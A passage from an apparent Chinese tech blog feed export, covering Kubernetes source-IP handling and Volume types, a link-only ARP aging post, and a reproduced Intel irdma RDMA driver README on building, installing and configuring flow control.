<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ kubectl get pod -o wide -l run&#x3D;source-ip-app</span><br><span class="line">NAME                            READY     STATUS    RESTARTS   AGE       IP             NODE</span><br><span class="line">source-ip-app-826191075-qehz4   1&#x2F;1       Running   0          20h       10.180.1.136   kubernetes-minion-group-6jst</span><br><span class="line">kubernetes-minion-group-6jst $ curl localhost:32122&#x2F;healthz</span><br><span class="line">1 Service Endpoints found</span><br><span class="line">kubernetes-minion-group-jj1t $ curl localhost:32122&#x2F;healthz</span><br><span class="line">No Service Endpoints Found</span><br></pre></td></tr></table></figure>

<p>    主节点运行的 service 控制器负责分配 cloud loadbalancer。在这样做的同时，它也会分配指向每个节点的 HTTP 健康检查的 port/path。等待大约 10 秒钟之后，没有 endpoints 的两个节点的健康检查会失败，然后 curl 负载均衡器的 ip：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ curl 104.198.149.140</span><br><span class="line">CLIENT VALUES:</span><br><span class="line">client\_address&#x3D;104.132.1.79</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="跨平台支持"><a href="#跨平台支持" class="headerlink" title="跨平台支持"></a>跨平台支持</h2><p>     由于 Kubernetes 1.5 在类型为 Type=LoadBalancer 的 Services 中支持源 IP 保存的特性仅在 cloudproviders 的子集中实现（GCP and Azure）。你的集群运行的 cloudprovider 可能以某些不同的方式满足 loadbalancer 的要求：</p>
<p>1、使用一个代理终止客户端连接并打开一个到你的 nodes/endpoints 的新连接。在这种情况下，源 IP 地址将永远是云负载均衡器的地址而不是客户端的。</p>
<p>2、使用一个包转发器，因此从客户端发送到负载均衡器 VIP 的请求在拥有客户端源 IP 地址的节点终止，而不被中间代理。</p>
<p>      第一类负载均衡器必须使用一种它和后端之间约定的协议来和真实的客户端 IP 通信，例如 HTTP X-FORWARDED-FOR 头，或者 proxy 协议。 第二类负载均衡器可以通过简单的在保存于 Service 的 service.spec.healthCheckNodePort 字段上创建一个 HTTP 健康检查点来使用上面描述的特性。</p>
]]></content>
      <tags>
        <tag>kubernetes 网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernets 详解--Volume</title>
    <url>/2020/09/21/Kubernets-%E8%AF%A6%E8%A7%A3-Volume/</url>
    <content><![CDATA[<h2 id="1-1-Volume"><a href="#1-1-Volume" class="headerlink" title="1.1 Volume"></a>1.1 Volume</h2><p>容器内的磁盘都是临时的，Volume引入的原因:</p>
<p>1、当一个容器宕机后，kubelet会重启改容器，但是容器内的文件就会丢失</p>
<p>2、一个Pod内的多个容器需要共享数据</p>
<h3 id="1-1-1-背景"><a href="#1-1-1-背景" class="headerlink" title="1.1.1 背景"></a>1.1.1 背景</h3><p>docker中也有Volume的概念docker中的Volume只是简单的一个磁盘目录或者其他Container中的目录，管理比较简单，虽然目前支持了volume driver，但是单个容器只支持使用一个volume driver。</p>
<p>   K8s中的Volume，有着明确的生命周期，与Pod的生命周期相同，Volume独立于Pod内的Container，在Container重启过程中，Volume保持不变。当然，让一个Pod停止退出时，Volume也会停止退出。除此之外，一个POD可以同时使用任意数量的，任意类型的卷。</p>
<p>Pod中的Container必须明确指定卷的挂载点</p>
<h3 id="1-1-2-卷类型"><a href="#1-1-2-卷类型" class="headerlink" title="1.1.2 卷类型"></a>1.1.2 卷类型</h3><h4 id="1-1-2-1-emptyDir"><a href="#1-1-2-1-emptyDir" class="headerlink" title="1.1.2.1 emptyDir"></a>1.1.2.1 emptyDir</h4><p>当使用emptyDir卷的Pod在节点创建时，会在该节点创建一个新的空目录，只要改Pod运行在该节点，该目录会一直存在，Pod内的容器可以将改目录挂载到不同的挂载点，但都可以读写emptyDir内的文件。当Pod不论什么原因被删除，emptyDir的数据都会永远被删除（一个Container Crash 并不会在该节点删除Pod，因此在Container crash时，数据不会丢失）</p>
<p>使用场景</p>
<p>1、 临时空间，例如基于磁盘空间做合并排序</p>
<p>2、 检测一个比较长的计算任务，能够让改计算任务从crash 恢复</p>
<p>3、 保存 内容管理Container 获取的文件，webserver 容器处理这些数据</p>
<p>默认情况下，emptyDir支持任何类型的后端存储：disk、ssd、网络存储。也可以通过设置 emptyDir.medium 为Memory，K8s会默认mount一个tmpfs（RAM-backed filesystem），因为是RAM Backed,因此tmpfs 通常很快。但是会在容器重启或者crash时，数据丢失。</p>
<h4 id="1-1-2-2-hostPath"><a href="#1-1-2-2-hostPath" class="headerlink" title="1.1.2.2 hostPath"></a>1.1.2.2 hostPath</h4><p>挂载Node节点以及存在的文件或者目录，不太常用，一下场景</p>
<p>1、 运行的容器需要访问宿主机的docker 内部信息 例如/var/lib/docker 目录</p>
<p>2、 容器内运行cadvisor，需要访问 /dev/cgroups</p>
<p>使用该类型的卷，需要注意以下几个方面：</p>
<p>1、 使用同一个模板创建的Pod，由于不同的节点有不同的目录信息，可能会导致不同的结果</p>
<p>2、 如果K8s增加了已知资源的调度，该调度不会考虑hostPath使用的资源</p>
<p>3、 如果宿主机目录上已经存在的目录，只可以被root可以写，所以容器需要root权限访问该目录，或者修改目录权限</p>
<h4 id="1-1-2-3-gcePersistentDisk"><a href="#1-1-2-3-gcePersistentDisk" class="headerlink" title="1.1.2.3 gcePersistentDisk"></a>1.1.2.3 gcePersistentDisk</h4><p>GCE提供的存储</p>
<h4 id="1-1-2-4-awsElasticBlockStore"><a href="#1-1-2-4-awsElasticBlockStore" class="headerlink" title="1.1.2.4 awsElasticBlockStore"></a>1.1.2.4 awsElasticBlockStore</h4><p>AWS提供的块存储</p>
<h4 id="1-1-2-5-NFS"><a href="#1-1-2-5-NFS" class="headerlink" title="1.1.2.5 NFS"></a>1.1.2.5 NFS</h4><p>与emptyDir不同，基于NFs的卷，在Pod删除时，卷并不会清除，只是与容器解绑。NFS支持同时读写。</p>
<p>NFS Server 需要单独搭建</p>
<h4 id="1-1-2-6-Iscsi"><a href="#1-1-2-6-Iscsi" class="headerlink" title="1.1.2.6 Iscsi"></a>1.1.2.6 Iscsi</h4><p>iScSi提供卷，在Pod删除时，卷并不会清除，只是与容器解绑</p>
<p>iSCSI Server 必须自己搭建</p>
<p>使用iscsi的一个特性，多个容器挂载卷时，可以指定挂载类型为read-only，但是有个缺点，iscsi卷只能同时被一个Container挂载为读写模式，不支持多个Container同时读写。</p>
<h4 id="1-1-2-7-Flocker"><a href="#1-1-2-7-Flocker" class="headerlink" title="1.1.2.7 Flocker"></a>1.1.2.7 Flocker</h4><p>开源，容器集群 卷管理，支持管理和编排多种存储后端的数据卷</p>
<p>一个flocker volume 允许挂载一个flocker dataset 到一个Pod</p>
<h4 id="1-1-2-8-Glusterfs"><a href="#1-1-2-8-Glusterfs" class="headerlink" title="1.1.2.8 Glusterfs"></a>1.1.2.8 Glusterfs</h4><p>支持多容器同时写</p>
<h4 id="1-1-2-9-RBD"><a href="#1-1-2-9-RBD" class="headerlink" title="1.1.2.9 RBD"></a>1.1.2.9 RBD</h4><p>Rados Block Device voluem 挂载到Pod</p>
<p>Rbd特点：可以被同时挂载为Read-Only。但是只能同时被一个Container 挂载为读写模式</p>
<h4 id="1-1-2-10-Cephfs"><a href="#1-1-2-10-Cephfs" class="headerlink" title="1.1.2.10 Cephfs"></a>1.1.2.10 Cephfs</h4><p>支持多容器同时写</p>
<h4 id="1-1-2-11-Gitrepo"><a href="#1-1-2-11-Gitrepo" class="headerlink" title="1.1.2.11 Gitrepo"></a>1.1.2.11 Gitrepo</h4><p>可以类似一个卷插件，挂载一个空目录，clone git上的仓库到该目录，Pod可以使用该仓库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">**apiVersion****:** **v1**</span><br><span class="line"></span><br><span class="line">**kind****:** **Pod**</span><br><span class="line"></span><br><span class="line">**metadata****:**</span><br><span class="line"></span><br><span class="line"> **name****:** **server**</span><br><span class="line"></span><br><span class="line">**spec****:**</span><br><span class="line"></span><br><span class="line"> **containers****:**</span><br><span class="line"></span><br><span class="line">**-** **image****:** **nginx**</span><br><span class="line"></span><br><span class="line"> **name****:** **nginx**</span><br><span class="line"></span><br><span class="line"> **volumeMounts****:**</span><br><span class="line"></span><br><span class="line">**-** **mountPath****:** **&#x2F;mypath**</span><br><span class="line"></span><br><span class="line"> **name****:** **git-volume**</span><br><span class="line"></span><br><span class="line"> **volumes****:**</span><br><span class="line"></span><br><span class="line">**-** **name****:** **git-volume**</span><br><span class="line"></span><br><span class="line"> **gitRepo****:**</span><br><span class="line"></span><br><span class="line"> **repository****:** **&quot;git@somewhere:me&#x2F;my-git-repository.git&quot;**</span><br><span class="line"></span><br><span class="line"> **revision****:** **&quot;22f1d8406d464b0c0874075539c1f2e96c253775&quot;**</span><br></pre></td></tr></table></figure>
<h4 id="1-1-2-12-secret"><a href="#1-1-2-12-secret" class="headerlink" title="1.1.2.12 secret"></a>1.1.2.12 secret</h4><p>存放敏感信息的卷，具体可以参考K8s的Secret介绍</p>
<h4 id="1-1-2-13-其他"><a href="#1-1-2-13-其他" class="headerlink" title="1.1.2.13 其他"></a>1.1.2.13 其他</h4><p>PersistentVolumeClain</p>
<p>dowanwardAPI</p>
<p>AzureFileVolume</p>
<p>AzureDiskVolume</p>
<p>vsphereVolume</p>
]]></content>
  </entry>
  <entry>
    <title>Linux中arp表的老化机制</title>
    <url>/2022/02/22/Linux%E4%B8%ADarp%E8%A1%A8%E7%9A%84%E8%80%81%E5%8C%96%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p><a href="https://www.cnblogs.com/lsgxeva/p/13749751.html" target="_blank" rel="noopener">https://www.cnblogs.com/lsgxeva/p/13749751.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>IntelE810 使用说明</title>
    <url>/2022/04/18/IntelE810-%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/</url>
    <content><![CDATA[<p>==============================================================================<br>irdma - Linux* RDMA Driver for the E800 Series and X722 Intel(R) Ethernet Controllers<br>==============================================================================</p>
<hr>
<h2 id="Contents"><a href="#Contents" class="headerlink" title="Contents"></a>Contents</h2><ul>
<li>Overview</li>
<li>Prerequisites</li>
<li>Supported OS List</li>
<li>Building and Installation</li>
<li>Confirm RDMA Functionality</li>
<li>iWARP/RoCEv2 Selection</li>
<li>iWARP Port Mapper (iwpmd)</li>
<li>Flow Control Settings</li>
<li>ECN Configuration</li>
<li>DSCP Configuration</li>
<li>Memory Requirements</li>
<li>Resource Profile Limits</li>
<li>Resource Limits Selector</li>
<li>RDMA Statistics</li>
<li>perftest</li>
<li>MPI</li>
<li>Performance</li>
<li>Interoperability</li>
<li>Dynamic Tracing</li>
<li>Dynamic Debug</li>
<li>Capturing RDMA Traffic with tcpdump</li>
<li>Virtualization</li>
<li>Known Issues/Notes</li>
</ul>
<hr>
<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>The irdma Linux* driver enables RDMA functionality on RDMA-capable Intel<br>network devices. Devices supported by this driver:</p>
<ul>
<li>Intel(R) Ethernet Controller E800 Series</li>
<li>Intel(R) Ethernet Network Connection X722</li>
</ul>
<p>The Intel Ethernet 800 Series and X722 each support a different set of RDMA features.<br>    - Intel Ethernet 800 Series supports both iWARP and RoCEv2 RDMA transports, and also supports<br>      congestion management features like priority flow control (PFC) and<br>      explicit congestion notification (ECN).<br>    - X722 supports only iWARP and a more limited set of configuration<br>      parameters.</p>
<p>Differences between adapters are described in each section of this document.</p>
<p>For both Intel Ethernet 800 Series and X722, the corresponding LAN driver (ice or i40e) must be<br>built from source included in this release and installed on your system prior<br>to installing irdma.</p>
<hr>
<h2 id="Prerequisites"><a href="#Prerequisites" class="headerlink" title="Prerequisites"></a>Prerequisites</h2><ul>
<li>Compile and install the Intel Ethernet 800 Series or X722 LAN PF driver from source included in<br>this release. Refer to the ice or i40e driver README for installation<br>instructions.<ul>
<li>For Intel Ethernet 800 Series, use the ice driver.</li>
<li>For X722 adapters, use the i40e driver.</li>
</ul>
</li>
<li>For best results, use a fully supported OS from the Supported OS List below.</li>
<li>For server memory requirements, see the “Memory Requirements” section of this<br>document.</li>
<li>Install required packages. Refer to the “Building” section of the rdma-core<br>README for required packages for your OS:<pre><code>  https://github.com/linux-rdma/rdma-core/blob/v35.0/README.md</code></pre>
<ul>
<li>RHEL 7 and SLES:<br>  Install all required packages listed in the rdma-core README.</li>
<li>RHEL 8:<br>  Install the required packages for RHEL 7, then install the following<br>  additional packages:<pre><code>  dnf install python3-docutils perl-generators python3-Cython python3-devel</code></pre>
</li>
<li>Ubuntu:<br>  Install the required packages listed in the rdma-core README, then<br>  install the following additional package:<pre><code>  apt-get install python3-docutils libsystemd-dev</code></pre>
</li>
</ul>
</li>
</ul>
<ul>
<li>Note:<br>The following are sample repo files that can be used to get the dependent packages<br>for rdma-core. However, these may not be all that is required.</li>
</ul>
<ul>
<li><p>For SLES 15.2<br>  <a href="http://download.opensuse.org/distribution/leap/15.2/repo/oss" target="_blank" rel="noopener">http://download.opensuse.org/distribution/leap/15.2/repo/oss</a></p>
</li>
<li><p>For RHEL 8.1<br>  <a href="http://vault.centos.org/8.1.1911/PowerTools/x86_64/os/" target="_blank" rel="noopener">http://vault.centos.org/8.1.1911/PowerTools/x86_64/os/</a></p>
</li>
</ul>
<hr>
<h2 id="Supported-OS-List"><a href="#Supported-OS-List" class="headerlink" title="Supported OS List"></a>Supported OS List</h2><pre><code>Supported:
    * RHEL 8.5
    * RHEL 8.4
    * SLES 15 SP3
    * Ubuntu 20.04
    * CentOS 7.4 with LTS 4.14

Supported Not Validated:
    * RHEL 8.3
    * RHEL 8.2
    * RHEL 8.1
    * RHEL 8
    * RHEL 7.9
    * RHEL 7.8
    * RHEL 7.7
    * RHEL 7.6 + OFED 4.17-1
    * RHEL 7.5 + OFED 4.17-1
    * RHEL 7.4 + OFED 4.17-1
    * RHEL 7.2 + OFED 4.8-2
    * SLES 15 SP2
    * SLES 15 SP1
    * SLES 12 SP5
    * SLES 15 + OFED 4.17-1
    * SLES 12 SP 4 + OFED 4.17-1
    * SLES 12 SP 3 + OFED 4.17-1
    * Ubuntu 18.04
    * Linux kernel stable 5.14.*
    * Linux kernel longterm 5.10.*, 5.4.*, 4.19.*, 4.14.*</code></pre>
<hr>
<h2 id="Building-and-Installation"><a href="#Building-and-Installation" class="headerlink" title="Building and Installation"></a>Building and Installation</h2><p>To build and install the irdma driver and supporting rdma-core libraries:</p>
<ol>
<li><p>Decompress the irdma driver archive:</p>
<pre><code> tar zxf irdma-&lt;version&gt;.tgz</code></pre>
</li>
<li><p>Build and install the RDMA driver:</p>
<pre><code> cd irdma-&lt;version&gt;
 ./build.sh</code></pre>
<p>By default, the irdma driver is built using in-distro RDMA libraries and<br>modules. Optionally, irdma may also be built using OFED modules. See the<br>Supported OS List above for a list of OSes that support this option.</p>
<ul>
<li>Note: Intel products are not validated on other vendors’ proprietary<pre><code>  software packages.</code></pre>
To install irdma using OFED modules:<ul>
<li>Download OFED-4.17-1.tgz from the OpenFabrics Alliance:<br>   wget <a href="http://openfabrics.org/downloads/OFED/ofed-4.17-1/OFED-4.17-1.tgz" target="_blank" rel="noopener">http://openfabrics.org/downloads/OFED/ofed-4.17-1/OFED-4.17-1.tgz</a></li>
<li>Decompress the archive:<br>   tar xzvf OFED-4.17.1.tgz</li>
<li>Install OFED:<br>   cd OFED-4.17-1<br>   ./install –all</li>
<li>Reboot after installation is complete.</li>
<li>Build the irdma driver with the “ofed” option:<br>   cd /path/to/irdma-<version><br>  ./build.sh ofed</version></li>
<li>Continue with the installation steps below.</li>
</ul>
</li>
</ul>
</li>
<li><p>Load the driver:<br> RHEL and Ubuntu:</p>
<pre><code> modprobe irdma</code></pre>
<p> SLES:</p>
<pre><code> modprobe irdma --allow-unsupported</code></pre>
<p> Notes:</p>
<pre><code> - This modprobe step is required only during installation. Normally,
   irdma is autoloaded via a udev rule when ice or i40e is loaded:
      /usr/lib/udev/rules.d/90-rdma-hw-modules.rules
 - For SLES, to automatically allow loading unsupported modules, add the
   following to /etc/modprobe.d/10-unsupported-modules.conf:
       allow_unsupported_modules 1</code></pre>
</li>
<li><p>Uninstall any previous versions of rdma-core user-space libraries.<br>For example, in RHEL:</p>
<pre><code> yum erase rdma-core

 If yum erase doesn&#39;t work (on RHEL 8.4 it fails with &quot;Error: The operation would result in removing the following protected packages: systemd&quot;),
 use the following command to uninstall the rdma-core packages:

 rpm -e --nodeps ibacm iwpmd libibumad libibverbs librdmacm srp_daemon infiniband-diags 2&gt;/dev/null
 rpm -e --nodeps rdma-core

 Note: The errors in post-uninstall scritps of these packages can be ignored with 2&gt;/dev/null.
       The packages provided to rpm -e --nodeps above could be looked up with the following command: rpm -e rdma-core
       The output is &quot;error: Failed dependencies: rdma-core(x86-64) =  is needed by (installed) rdma-core-devel
                                                  rdma-core(x86-64) =  is needed by (installed) iwpmd
                                                  rdma-core(x86-64) =  is needed by (installed) libibumad
                                                  rdma-core(x86-64) =  is needed by (installed) libibverbs
                                                  rdma-core(x86-64) =  is needed by (installed) ibacm
                                                  rdma-core(x86-64) =  is needed by (installed) librdmacm
                                                  rdma-core(x86-64) =  is needed by (installed) srp_daemon&quot;

       To confirm that rdma-core is uninstalled after rpm -e --nodeps run: yum erase rdma-core
       The output should look like this: &quot;No match for argument: rdma-core No packages marked for removal... Nothing to do. Complete!&quot;</code></pre>
</li>
</ol>
<pre><code>Note: &quot;yum erase rdma-core&quot; will also remove any packages that depend on
      rdma-core, such as perftest or fio. Please re-install them after
      installing rdma-core.</code></pre>
<ol start="5">
<li><p>Patch, build, and install rdma-core user space libraries:</p>
<p> RHEL:</p>
<pre><code> # Download rdma-core-35.0.tar.gz from GitHub
 wget https://github.com/linux-rdma/rdma-core/releases/download/v35.0/rdma-core-35.0.tar.gz
 # Apply patch libirdma-35.0.patch to rdma-core
 tar -xzvf rdma-core-35.0.tar.gz
 cd rdma-core-35.0
 patch -p2 &lt; /path/to/irdma-&lt;version&gt;/libirdma-35.0.patch
 # Make sure directories rdma-core/redhat and contents are under group &#39;root&#39;
 cd ..
 chgrp -R root rdma-core-35.0/redhat
 # Zip with proper name for building (note &quot;tgz&quot; extension instead of &quot;tar.gz&quot;)
 tar -zcvf rdma-core-35.0.tgz rdma-core-35.0
 # Build rdma-core
 mkdir -p ~/rpmbuild/SOURCES
 mkdir -p ~/rpmbuild/SPECS
 cp rdma-core-35.0.tgz ~/rpmbuild/SOURCES/
 cd ~/rpmbuild/SOURCES
 tar -xzvf rdma-core-35.0.tgz
 cp ~/rpmbuild/SOURCES/rdma-core-35.0/redhat/rdma-core.spec ~/rpmbuild/SPECS/
 cd ~/rpmbuild/SPECS/
 rpmbuild -ba rdma-core.spec
 # Install RPMs
 cd ~/rpmbuild/RPMS/x86_64
 yum install *35.0*.rpm</code></pre>
<p> SLES:</p>
<pre><code> # Download rdma-core-35.0.tar.gz from GitHub
 wget https://github.com/linux-rdma/rdma-core/releases/download/v35.0/rdma-core-35.0.tar.gz
 # Apply patch libirdma-35.0.patch to rdma-core
 tar -xzvf rdma-core-35.0.tar.gz
 cd rdma-core-35.0
 patch -p2 &lt; /path/to/irdma-&lt;version&gt;/libirdma-35.0.patch
 cd ..
 # Zip the rdma-core directory into a tar.gz archive
 tar -zcvf rdma-core-35.0.tar.gz rdma-core-35.0
 # Create an empty placeholder baselibs.conf file
 touch /usr/src/packages/SOURCES/baselibs.conf
 # Build rdma-core
 cp rdma-core-35.0.tar.gz /usr/src/packages/SOURCES
 cp rdma-core-35.0/suse/rdma-core.spec /usr/src/packages/SPECS/
 cd /usr/src/packages/SPECS/
 rpmbuild -ba rdma-core.spec --without=curlmini
 cd /usr/src/packages/RPMS/x86_64
 rpm -ivh --force *35.0*.rpm</code></pre>
<p> Ubuntu:</p>
<pre><code> To create Debian packages from rdma-core:
 # Download rdma-core-35.0.tar.gz from GitHub
 wget https://github.com/linux-rdma/rdma-core/releases/download/v35.0/rdma-core-35.0.tar.gz
 # Apply patch libirdma-35.0.patch to rdma-core
 tar -xzvf rdma-core-35.0.tar.gz
 cd rdma-core-35.0
 patch -p2 &lt; /path/to/irdma-&lt;version&gt;/libirdma-35.0.patch
 # Build rdma-core
 dh clean --with python3,systemd --builddirectory=build-deb
 dh build --with systemd --builddirectory=build-deb
 sudo dh binary --with python3,systemd --builddirectory=build-deb
 # This creates .deb packages in the parent directory
 # To install the .deb packages
 sudo dpkg -i ../*.deb</code></pre>
<p> Debian:</p>
<pre><code> To create Debian packages from rdma-core:
 # Download rdma-core-35.0.tar.gz from GitHub
 wget https://github.com/linux-rdma/rdma-core/releases/download/v35.0/rdma-core-35.0.tar.gz
 # Apply patch libirdma-35.0.patch to rdma-core
 tar -xzvf rdma-core-35.0.tar.gz
 cd rdma-core-35.0
 patch -p2 &lt; /path/to/irdma-&lt;version&gt;/libirdma-35.0.patch
 # Build rdma-core
 dpkg-buildpackage -rfakeroot -b -uc -us -d
 # This creates .deb packages in the parent directory
 # To install the .deb packages
 sudo dpkg -i ../*.deb</code></pre>
</li>
<li><p>Add the following to /etc/security/limits.conf:</p>
<pre><code> * soft memlock unlimited
 * hard memlock unlimited
 * soft nofile 1048000
 * hard nofile 1048000</code></pre>
<p>In addition, the files /etc/systemd/user.conf and /etc/systemd/system.conf may need to have the following line:<br> DefaultLimitMEMLOCK=1073741824<br>This will change the Max locked memory for all process to 1G.</p>
<p>Restart the active session so new values will take effect.<br>This avoids any limits on user mode applications as far as pinned memory and number of open files used.</p>
<p> Note: A reboot may be needed if any RDMA applications were running during the rdma-core reinstall.</p>
</li>
</ol>
<hr>
<h2 id="Confirm-RDMA-functionality"><a href="#Confirm-RDMA-functionality" class="headerlink" title="Confirm RDMA functionality"></a>Confirm RDMA functionality</h2><p>After successful installation, RDMA devices are listed in the output of<br>“ibv_devices”. For example:<br>    # ibv_devices<br>    device                 node GUID<br>    ——              —————-<br>    rdmap175s0f0        40a6b70b6f300000<br>    rdmap175s0f1        40a6b70b6f310000</p>
<p>Notes:<br>    - Device names may differ depending on OS or kernel.<br>    - Node GUID is different for the same device in iWARP vs. RoCEv2 mode.</p>
<p>Each RDMA device is associated with a network interface. The sysfs filesystem<br>can help show how these devices are related. For example:<br>    - To show RDMA devices associated with the “ens801f0” network interface:<br>         # ls /sys/class/net/ens801f0/device/infiniband/<br>         rdmap175s0f0<br>    - To show the network interface associated with the “rdmap175s0f0” RDMA<br>      device:<br>         # ls /sys/class/infiniband/rdmap175s0f0/device/net/<br>         ens801f0</p>
<p>Before running RDMA applications, ensure that all hosts have IP addresses<br>assigned to the network interface associated with the RDMA device. The RDMA<br>device uses the IP configuration from the corresponding network interface.<br>There is no additional configuration required for the RDMA device.</p>
<p>To confirm RDMA functionality, run rping:</p>
<pre><code>1) Start the rping server:
      rping -sdvVa [server IP address]

2) Start the rping client:
      rping -cdvVa [server IP address] -C 10

3) rping will run for 10 iterations (-C 10) and print data payloads on
   the console.

Notes:
    - Confirm rping functionality both from each host to itself and between
      hosts. For example:
        * Run rping server and client both on Host A.
        * Run rping server and client both on Host B.
        * Run rping server on Host A and rping client on Host B.
        * Run rping server on Host B and rping client on Host A.
    - When connecting multiple rping clients to a persistent rping server,
      older kernels may experience a crash related to the handling of cm_id
      values in the kernel stack. With Intel Ethernet 800 Series, this problem typically appears
      in the system log as a kernel oops and stack trace pointing to
      irdma_accept. The issue has been fixed in kernels 5.4.61 and later.
      For patch details, see:
      https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/infiniband/core/ucma.c?h=v5.9-rc2&amp;id=7c11910783a1ea17e88777552ef146cace607b3c</code></pre>
<hr>
<h2 id="iWARP-RoCEv2-Selection"><a href="#iWARP-RoCEv2-Selection" class="headerlink" title="iWARP/RoCEv2 Selection"></a>iWARP/RoCEv2 Selection</h2><p>X722:<br>The X722 adapter supports only the iWARP transport.</p>
<p>Intel Ethernet 800 Series:<br>The Intel Ethernet 800 Series supports both iWARP and RoCEv2 transports. By default, the<br>irdma driver is loaded in iWARP mode. RoCEv2 may be selected globally<br>(for all ports) using the module parameter “roce_ena=1”</p>
<p>— Global Selection<br>To automatically enable RoCEv2 mode for all ports when the irdma driver is<br>loaded, add the following line to /etc/modprobe.d/irdma.conf:<br>    options irdma roce_ena=1</p>
<p>The irdma driver may also be manually loaded with the “roce_ena=1” parameter<br>on the modprobe command line. To manually load all irdma ports in RoCEv2 mode:</p>
<ul>
<li>If the irdma driver is currently loaded, first unload it:<pre><code>rmmod irdma</code></pre>
</li>
<li>Reload the driver in RoCEv2 mode:<pre><code>modprobe irdma roce_ena=1</code></pre>
</li>
</ul>
<p>Alternatively, ports may be individually set to RoCEv2 mode using the module<br>parameter roce_port_cfg set as a binary bit field converted to a decimal number.<br>All other ports are configured for iWARP mode.<br>    Example 1 - to configure only port 0 in RoCE v2 mode (0001b -&gt; 1):<br>        modprobe irdma roce_port_cfg=1<br>    Example 2 - to configure both port 0 and port 1 in RoCE v2 mode (0011b -&gt; 3):<br>        modprobe irdma roce_port_cfg=3<br>    Example 3 - to configure only port 3 in RoCE v2 mode (1000b -&gt; 8):<br>        modprobe irdma roce_port_cfg=8</p>
<p>Note: The roce_ena module parameter supersedes roce_port_cfg.</p>
<p>If the irdma driver is currently loaded, first unload it:<br>        rmmod irdma<br>Reload the driver with appropriate roce_ena value:<br>        modprobe irdma roce_ena=1</p>
<hr>
<h2 id="iWARP-Port-Mapper-iwpmd"><a href="#iWARP-Port-Mapper-iwpmd" class="headerlink" title="iWARP Port Mapper (iwpmd)"></a>iWARP Port Mapper (iwpmd)</h2><p>The iWARP port mapper service (iwpmd) coordinates with the host network stack<br>and manages TCP port space for iWARP applications.</p>
<p>iwpmd is automatically loaded when ice or i40e is loaded via udev rules in<br>/usr/lib/udev/rules.d/90-iwpmd.rules.</p>
<p>To verify iWARP port mapper status:<br>    systemctl status iwpmd</p>
<hr>
<h2 id="Flow-Control-Settings"><a href="#Flow-Control-Settings" class="headerlink" title="Flow Control Settings"></a>Flow Control Settings</h2><p>X722:<br>The X722 supports only link-level flow control (LFC).</p>
<p>Intel Ethernet 800 Series:<br>The Intel Ethernet 800 Series supports both link-level flow control (LFC) and priority<br>flow control (PFC). Enabling flow control is strongly recommended when using<br>Intel Ethernet 800 Series in RoCEv2 mode.</p>
<p>— Link Level Flow Control (LFC) (Intel Ethernet 800 Series and X722)</p>
<p>To enable link-level flow control on Intel Ethernet 800 Series or X722, use “ethtool -A”.<br>For example, to enable LFC in both directions (rx and tx):<br>    ethtool -A DEVNAME rx on tx on</p>
<p>Confirm the setting with “ethtool -a”:<br>    ethtool -a DEVNAME</p>
<p>Sample output:<br>    Pause parameters for interface:<br>    Autonegotiate: on<br>    RX: on<br>    TX: on<br>    RX negotiated:  on<br>    TX negotiated:  on</p>
<p>Full enablement of LFC requires the switch or link partner be configured for<br>rx and tx pause frames. Refer to switch vendor documentation for more details.</p>
<p>— Priority Level Flow Control (PFC) (Intel Ethernet 800 Series only)</p>
<p>Priority flow control (PFC) is supported on Intel Ethernet 800 Series in both willing and<br>non-willing modes. Intel Ethernet 800 Series also has two Data Center Bridging (DCB) modes: software<br>and firmware. For more background on software and firmware modes, refer to the<br>Intel Ethernet 800 Series ice driver README.</p>
<ul>
<li>For PFC willing mode, software DCB is recommended.</li>
<li>For PFC non-willing mode, software DCB must be used.</li>
</ul>
<p>Notes: Intel Ethernet 800 Series supports a maximum of 4 traffic classes (TCs), one of which may<br>       have PFC enabled. In addition, iWARP mode requires a VLAN to be configured to fully enable PFC.</p>
<p>*** PFC willing mode</p>
<p>In willing mode, Intel Ethernet 800 Series is “willing” to accept DCB settings from its link<br>partner. DCB is configured on the link partner (typically a switch), and the<br>Intel Ethernet 800 Series will automatically discover and apply the DCB settings to its own port.<br>This simplifies DCB configuration in a larger cluster and eliminates the need<br>to independently configure DCB on both sides of the link.</p>
<p>To enable PFC in willing mode on Intel Ethernet 800 Series:</p>
<ol>
<li>Use ethtool to disable firmware DCB.<br>ethtool –set-priv-flags DEVNAME fw-lldp-agent off</li>
</ol>
<p>To confirm settings, use following command:<br>    ethtool –show-priv-flags DEVNAME</p>
<p>Expected output:<br>    fw-lldp-agent     :off</p>
<ol start="2">
<li><p>Install OpenLLDP if not already installed:</p>
<pre><code>  yum install lldpad</code></pre>
</li>
<li><p>Start the Open LLDP daemon:</p>
<pre><code> lldpad -d</code></pre>
</li>
<li><p>Disable CEE transmission:</p>
<pre><code> lldptool -Ti DEVNAME -V CEE-DCBX enableTx=no</code></pre>
</li>
<li><p>Reset the DCBX mode to be ‘auto’ (start in IEEE DCBX mode) after the next lldpad restart:</p>
<pre><code> lldptool -Ti DEVNAME -V IEEE-DCBX mode=reset</code></pre>
</li>
<li><p>Configure willing configuration for interface:</p>
<pre><code> lldptool -Ti DEVNAME -V ETS-CFG enableTx=yes willing=yes</code></pre>
</li>
<li><p>Configure willing recommendation for interface:</p>
<pre><code> lldptool -Ti DEVNAME -V ETS-REC enableTx=yes</code></pre>
</li>
<li><p>Configure willing PFC for interface:</p>
<pre><code> lldptool -Ti DEVNAME -V PFC enable=yes willing=yes enableTx=yes</code></pre>
</li>
<li><p>Terminate the first instance of lldpad that was started (e.g. from initrd):</p>
<pre><code> lldpad -k</code></pre>
</li>
<li><p>Remove lldpad state records from shared memory:</p>
<pre><code>lldpad -s</code></pre>
</li>
<li><p>Restart service lldpad:</p>
<pre><code>systemctl restart lldpad.service</code></pre>
</li>
<li><p>Check CEE mode enableTx settings. Must be no:</p>
<pre><code>lldptool -ti DEVNAME -V CEE-DCBX -c</code></pre>
</li>
</ol>
<p>Expected output:<br>        enableTx=no</p>
<ol start="13">
<li>Check DCBX mode settings. Must be auto:<pre><code>lldptool -ti DEVNAME -V IEEE-DCBX -c</code></pre>
</li>
